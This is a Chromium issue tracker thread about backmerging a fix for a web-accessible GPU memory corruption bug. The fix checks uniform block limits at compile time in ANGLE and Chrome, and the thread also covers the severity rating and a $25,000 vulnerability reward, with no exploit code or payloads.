Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1586673) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1586673) appears to be after beta branch point (1582197).
Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ge...@google.com (2026-03-03)

> Which CLs should be backmerged? (Please include Gerrit links.)

- <https://chromium-review.googlesource.com/c/angle/angle/+/7568089>
- <https://chromium-review.googlesource.com/c/chromium/src/+/7568129>

> Has this fix been verified on Canary to not pose any stability regressions?

It has been live on canary for ~1 week with no issues so far.

> Does this fix pose any potential non-verifiable stability risks?

No

> Does this fix pose any known compatibility risks?

No

> Does it require manual verification by the test team? If so, please describe required testing.

No

### dr...@chromium.org (2026-03-03)

Approved to merge to M146. We're not planning more M145 or M144 releases, so we don't need those merges.

### ch...@google.com (2026-03-10)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2026-03-10)

Project: angle/angle  

Branch:  chromium/7680  

Author:  Geoff Lang [geofflang@chromium.org](mailto:geofflang@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7653195>

M146: Optionally validate GL\_MAX\_\*\_UNIFORM\_BLOCKS at compile time.

---


Expand for full commit details
```
     
    These were validated at link time but some drivers have compiler crashes 
    when compiling shaders with too many uniform blocks. 
     
    Bug: chromium:475877320 
    Change-Id: I4413ce06307b4fe9e27105d85f66f610c235a301 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7568089 
    Commit-Queue: Geoff Lang <geofflang@chromium.org> 
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org> 
    (cherry picked from commit bf6dd974238bceec7a0a27987e2e02e177f2b7f8) 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7653195

```

---

Files:

- M `include/GLSLANG/ShaderLang.h`
- M `include/platform/autogen/FeaturesGL_autogen.h`
- M `include/platform/gl_features.json`
- M `src/compiler/translator/Compiler.cpp`
- M `src/compiler/translator/ParseContext.cpp`
- M `src/compiler/translator/ParseContext.h`
- M `src/compiler/translator/ShaderLang.cpp`
- M `src/libANGLE/Compiler.cpp`
- M `src/libANGLE/renderer/gl/ShaderGL.cpp`
- M `src/libANGLE/renderer/gl/renderergl_utils.cpp`
- M `src/tests/gl_tests/GLSLValidationTest.cpp`
- M `util/autogen/angle_features_autogen.cpp`
- M `util/autogen/angle_features_autogen.h`

---

Hash: [05459080c9a323e89a52209efb799d6dc5b68a86](https://chromiumdash.appspot.com/commit/05459080c9a323e89a52209efb799d6dc5b68a86)  

Date: Wed Feb 11 20:51:46 2026


---

### dx...@google.com (2026-03-12)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Geoff Lang [geofflang@chromium.org](mailto:geofflang@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7653136>

M146: Validate uniform block count limits at compile time on IMG.

---


Expand for full commit details
```
     
    Normally these limits are validated at link time but the IMG compiler 
    has issues when these limits are exceeded. Validate at compile time 
    instead. 
     
    (cherry picked from commit fbfb27470bf6b7bff084d9290e26c1afb52ebed5) 
     
    Bug: chromium:475877320 
    Change-Id: Ieeed6914b8cdd2b5e50242d06facae62badddefd 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7568129 
    Auto-Submit: Geoff Lang <geofflang@chromium.org> 
    Reviewed-by: Kyle Charbonneau <kylechar@chromium.org> 
    Commit-Queue: Kyle Charbonneau <kylechar@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1586673} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7653136 
    Commit-Queue: Geoff Lang <geofflang@chromium.org> 
    Reviewed-by: Zhenyao Mo <zmo@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7680@{#2424} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `gpu/command_buffer/service/gles2_cmd_decoder.cc`
- M `gpu/config/gpu_driver_bug_list.json`
- M `gpu/config/gpu_workaround_list.txt`

---

Hash: [f18370965e01ad1bd26959b89de64056bd1f6bf0](https://chromiumdash.appspot.com/commit/f18370965e01ad1bd26959b89de64056bd1f6bf0)  

Date: Thu Mar 12 16:32:46 2026


---

### ha...@gmail.com (2026-03-14)

VRP seems to have forgotten my report.It's been several weeks.

### dr...@chromium.org (2026-03-14)

Your report only entered the VRP queue in [#comment19](https://issues.chromium.org/issues/475877320#comment19). We're working through a significant volume of bugs right now, but it is in the queue.

### wf...@chromium.org (2026-03-18)

GPU process memory corruption on Android that's web accessible = sev-critical

### sp...@google.com (2026-03-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $25000.00 for this report.

Rationale for this decision:
Memory corruption in a non-sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ha...@gmail.com (2026-03-20)

I have a question. Since this can be triggered from the renderer, isn't there an additional $7000 reward for the renderer bonus?

### ch...@google.com (2026-06-09)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/475877320)*
